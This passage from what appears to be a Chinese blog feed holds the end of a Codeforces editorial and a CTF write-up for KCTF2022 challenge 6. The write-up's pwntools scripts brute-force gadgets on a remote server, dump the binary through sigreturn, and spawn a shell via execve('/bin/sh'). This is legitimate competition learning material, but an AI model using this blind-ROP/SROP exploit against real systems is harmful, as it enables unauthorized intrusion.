cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    target=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        target*=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="built_in">bfs</span>(x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="In-The-End"><a href="#In-The-End" class="headerlink" title="In The End"></a>In The End</h2><p>这波应该是手速场，手速快就是上大分，继上一次罚时爆炸之后这场没有一点罚时，挺好的，刚刚掉蓝一下给加回来了。</p><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/5.png" alt="5"></p><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/6.png" alt="6"></p><p>100分！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这波 &lt;code&gt;div2&lt;/code&gt; 上大分，写波题解。&lt;/p&gt;
&lt;p&gt;实况录屏&lt;a href=&quot;https://www.bilibili.com/video/BV1RS4y1B7g3&quot;&gt;在这&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="题解" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>KCTF2022春季赛 第六题 writeup</title>
    <link href="http://example.com/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/"/>
    <id>http://example.com/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/</id>
    <published>2022-05-23T04:00:00.000Z</published>
    <updated>2022-05-23T09:30:23.608Z</updated>
    
    <content type="html"><![CDATA[<p>KCTF2022春季赛 第六题 writeup</p><span id="more"></span><p>这题，BROP提示给的很明显，所以就是盲打，不管怎么说先问(bao)候(da)一下出题人。</p><p>首先我们一开始什么都不知道，就先确定一下一些基本信息，那么就先测试一下缓冲区的长度，最后发现缓冲区长度为0x10。</p><p>我们先执行一遍正常流程，大概就是：</p><ol><li>输出一句话</li><li>输入</li><li>输出一句话</li></ol><p>当存在栈溢出的时候，最后一句话输出不出来，因此可以断定，溢出是发生在自己定义的函数的。大概写一下伪代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void func()&#123;</span><br><span class="line">char buf[16];</span><br><span class="line">gets(buf);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">puts(&quot;hacker, TNT!&quot;);</span><br><span class="line">func();</span><br><span class="line">puts(&quot;TNT TNT!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，输出第一句话的语句可能也在 <code>func</code> 里面，但是不影响，我们先爆破第一个字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10100</span>)</span><br><span class="line">        s=p.recvline()</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p8(i)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        ss=(p.recvline(timeout=<span class="number">1</span>))</span><br><span class="line">        <span class="built_in">print</span>(ss)</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/1.png" alt="1"></p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/2.png" alt="2"></p><p>可以发现，当覆盖一个 <code>\xb0</code> 字节的时候，程序重新执行了一遍 <code>main</code> 函数，当覆盖一个 <code>\xce</code> 字节的时候，程序执行正常流程退出了，那么我们可以得出以下信息：</p><ul><li><code>main</code> 函数的低位为 <code>0xb0</code></li><li><code>func</code> 函数的返回地址为 <code>0xce</code></li></ul><p>这里其实可以确定输出第一句话的函数在 <code>main</code> 当中了，因为如果在 <code>func</code> 函数当中，那么一定会存在两个地址使得程序重新执行一遍流程，那就是改成了 <code>func</code> 函数和 <code>main</code> 函数的地址都会这样，没有就说明第一句话输出不在 <code>main</code> 当中。</p><p>然后再勇敢地一试，猜测它的地址为 <code>0x4000b0</code>，结果发现也是重新执行了 <code>main</code> 函数，这也间接断定了这个程序是 <code>64</code> 位的。上面推出的两个地址也确定了。</p><p>接下来，就可以尝试取寻找 <code>gadget</code> 了，我们要寻找的首要 <code>gadget</code> 自然就是 <code>pop rdi ret</code> 了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b0</span></span><br><span class="line">ret=<span class="number">0x4000ce</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400000</span>,<span class="number">0x401900</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10100</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        s=p.recvline()</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(i)+p64(ret)+p64(main)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        ss=(p.recvline(timeout=<span class="number">1</span>))</span><br><span class="line">        <span class="built_in">print</span>(ss)</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>在这个 <code>payload</code> 当中，可以发现，如果寻找的 <code>gadget</code> 为 <code>ret</code>，那么则会继续流程，如果 <code>gadget</code> 类似于 <code>pop xxx ret</code> 的话则会重新执行 <code>main</code> 函数。结果 <code>ret</code> 找到了很多，其它的 <code>gadget</code> 愣是没找到一个，于是决定往后面再加一个 <code>p64(main)</code>，结果居然找到了七个地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a0x4000f5 pop xxx *2;ret</span><br><span class="line">0x4000fa pop xxx *2;ret</span><br><span class="line">0x4000fb pop xxx *2;ret</span><br><span class="line">0x4000fd pop xxx *2;ret</span><br><span class="line">0x4000fe pop xxx *2;ret</span><br><span class="line">0x400100 pop xxx *2;ret</span><br><span class="line">0x400101 ret</span><br><span class="line">0x400102 pop xxx *2 ; ret</span><br><span class="line">0x400106 ret</span><br></pre></td></tr></table></figure><p>然后我尝试取寻找它的 <code>IO</code> 函数去输出它的 <code>got</code> 表，但是测了很多地址都没有发现有输出 <code>\n</code> 字节，这里也排除它用 <code>puts</code> 函数输出的可能，但是它可能也用了 <code>printf</code> 或者是 <code>write</code> 函数之类的，但是我还是往 <code>printf</code> 去想而没有往 <code>write</code> 去想。然后我就拿那些 <code>gadget</code> 试着传参看看，结果不出意外都失败了，无任何回显。</p><p>这里我困扰了很久，后来我们队的 <code>ThTsOd</code> 师傅给了我一个很重要的思路，那就是</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/3.png" alt="3"></p><p>再来看看精致得分的规则：</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/4.png" alt="4"></p><p>直接拉满了那就很能说明问题了，肯定是甚至没有 <code>plt</code> 或者 <code>got</code> 表的那种文件，直接用的 <code>syscall</code> 才能有这么小的长度。</p><p>这里借用以下 <code>ThTsOd</code> 师傅的脚本，帮我们确定了一些 <code>syscall</code> 的位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">context.log_level=<span class="string">&#x27;warn&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b5</span></span><br><span class="line">ret=<span class="number">0x400101</span></span><br><span class="line">pop_rdi = <span class="number">0x400101</span> - <span class="number">1</span></span><br><span class="line">pop_rsi_2 = <span class="number">0x400101</span> - <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4000b0 0 b&#x27;hacker, TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000ce 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">INPUT</span></span><br><span class="line"><span class="string">0x4000b5 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b6 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b8 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c2 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c7 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c9 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400000</span>,<span class="number">0x400120</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10005</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            s=p.recv()</span><br><span class="line">            payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(i)+p64(pop_rdi)*<span class="number">3</span>+p64(<span class="number">1</span>)+p64(pop_rsi_2)+p64(<span class="number">0x400000</span>)*<span class="number">2</span>+p64(<span class="number">0x4000ce</span>)</span><br><span class="line">            <span class="comment">#payload=b&#x27;a&#x27;*0x10+</span></span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            p.send(payload)</span><br><span class="line">            p.send(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">            ss=(p.recvall(timeout=<span class="number">1</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(i),k,ss)</span><br><span class="line">            <span class="comment">#if ss==s:</span></span><br><span class="line">            <span class="comment">#    break</span></span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="comment">#sleep(2)</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">41 5c 41 5d 41 5e 41 5f c3</span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">101 RET</span></span><br><span class="line"><span class="string">102 POP</span></span><br><span class="line"><span class="string">106 RET</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个脚本中，我们通过修改 <code>rax</code> 的值成功调用<code>sys_read</code> <code>dump</code> 出了栈上面的内存。</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/5.png" alt="5"></p><p>由此我们确定了 <code>syscall ret</code> 的 <code>gadget</code> 在 <code>0x4000ec</code> 的地方。但是还需要有一个固定能 <code>read</code> 的 <code>gadget</code> 才行，因为只有这样我们才能控制 <code>rax</code> 寄存器的值，来选择我们需要的系统调用。</p><p>当然我们也找到了，在<code>0x4000f3</code>，并且发现需要传两个参数才能把 <code>rop</code> 链拼接上去，感觉这里两个参数应该是 <code>add rsp,0x10</code> 产生的。</p><p>那也不用管那么多了，通过这两个 <code>gadget</code> 我们就能进行一次指定的系统调用，这里我们不选择使用 <code>write</code> 调用泄露栈的内存，我们直接把 <code>elf</code> 的内存给 <code>dump</code> 出来就行，因为没有 <code>gadget</code> 那我们直接用 <code>sigreturn</code> 的方式控制寄存器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b5</span></span><br><span class="line">ret=<span class="number">0x400101</span></span><br><span class="line">pop_rdi = <span class="number">0x400101</span> - <span class="number">1</span></span><br><span class="line">pop_rsi_2 = <span class="number">0x400101</span> - <span class="number">3</span></span><br><span class="line">syscall=<span class="number">0x4000ec</span></span><br><span class="line">sysread=<span class="number">0x4000f3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4000b0 0 b&#x27;hacker, TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000ce 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">INPUT</span></span><br><span class="line"><span class="string">0x4000b5 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b6 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b8 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c2 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c7 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c9 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4000f3</span>,<span class="number">0x4000f4</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10088</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            s=p.recv()</span><br><span class="line">            rop=SigreturnFrame()</span><br><span class="line">            rop.rax=<span class="number">1</span></span><br><span class="line">            rop.rdi=<span class="number">1</span></span><br><span class="line">            rop.rip=syscall            </span><br><span class="line">            rop.rsp=<span class="number">0x400000</span></span><br><span class="line">            rop.rbp=<span class="number">0x400000</span></span><br><span class="line">            rop.rsi=<span class="number">0x400000</span></span><br><span class="line">            rop.rdx=<span class="number">0x400</span></span><br><span class="line">            </span><br><span class="line">            payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(sysread)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(syscall)+<span class="built_in">eval</span>(<span class="built_in">str</span>(rop))</span><br><span class="line">            p.send(payload)</span><br><span class="line">            p.send(<span class="string">&#x27;B&#x27;</span>*<span class="number">15</span>)</span><br><span class="line">            p.interactive()        </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="comment">#sleep(2)</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">41 5c 41 5d 41 5e 41 5f c3</span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">101 RET</span></span><br><span class="line"><span class="string">102 POP</span></span><br><span class="line"><span class="string">106 RET</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p> <img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/6.png" alt="6"></p><p>可以看到我们就成功用 <code>sigreturn</code> 调用了 <code>sys_write(1,0x400000,0x400)</code> ，至此终于不是瞎子视角了，这里再是 <code>ThTsOd</code> 师傅帮我重建了 <code>ELF</code> 文件，<code>IDA</code> 一开</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/7.png" alt="7"></p><p>其实现在 <code>IDA</code> 已经不重要了，主要还是能本地调试就非常爽。</p><p>但是这里又卡了一个关，那就是找不到确定地址可写的地方写上 <code>/bin/sh</code>。这里又双叒叕是 <code>ThTsOd</code> 师傅向我指明了 <code>0x600000</code> 处的内存是可读可写的。</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/8.png" alt="8"></p><p>打开一看果然是这样，而且给的内存还挺多，那就爽了，直接先调用 <code>sys_read</code> 再上面写上 <code>/bin/sh</code> 顺便接上 <code>rop</code> 链，然后再一次 <code>sigreturn</code> 执行 <code>execve(&#39;/bin/sh&#39;,0,0)</code>  去获得 <code>shell</code>。</p><p>最终 <code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b5</span></span><br><span class="line">ret=<span class="number">0x400101</span></span><br><span class="line">syscall=<span class="number">0x4000ec</span></span><br><span class="line">sysread=<span class="number">0x4000f3</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10100</span>)</span><br><span class="line">s=p.recv()</span><br><span class="line">rop=SigreturnFrame()</span><br><span class="line">rop.rax=<span class="number">0</span></span><br><span class="line">rop.rdi=<span class="number">0</span></span><br><span class="line">rop.rip=syscall            </span><br><span class="line">rop.rsp=<span class="number">0x600020</span></span><br><span class="line">rop.rbp=<span class="number">0x600020</span></span><br><span class="line">rop.rsi=<span class="number">0x600000</span></span><br><span class="line">rop.rdx=<span class="number">0x400</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(syscall)+p64(syscall)+<span class="built_in">eval</span>(<span class="built_in">str</span>(rop))</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>)</span><br><span class="line">rop.rax=<span class="number">59</span></span><br><span class="line">rop.rip=syscall</span><br><span class="line">rop.rdi=<span class="number">0x600000</span></span><br><span class="line">rop.rdx=<span class="number">0</span></span><br><span class="line">rop.rsi=<span class="number">0</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(sysread)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(syscall)+<span class="built_in">eval</span>(<span class="built_in">str</span>(rop)))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这题后面不难，主要是想办法 <code>dump</code> 内存重建 <code>elf</code>，然后就是签到的做法了。</p><p>题外话：那我不禁对那个精致分仅有 <code>87</code> 分的 <code>pwn</code> 题瑟瑟发抖了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;KCTF2022春季赛 第六题 writeup&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    <category term="brop" scheme="http://example.com/categories/ctf/pwn/brop/"/>
    
    
  </entry>
  
  <entry>
    <title>Codeforces Round 788(Div.2)题解</title>
    <link href="http://example.com/2022/05/07/Codeforces%20Round%20788(Div.2)/"/>
    <id>http://example.com/2022/05/07/Codeforces%20Round%20788(Div.2)/</id>
    <published>2022-05-07T10:00:00.000Z</published>
    <updated>2022-05-07T10:48:20.040Z</updated>
    
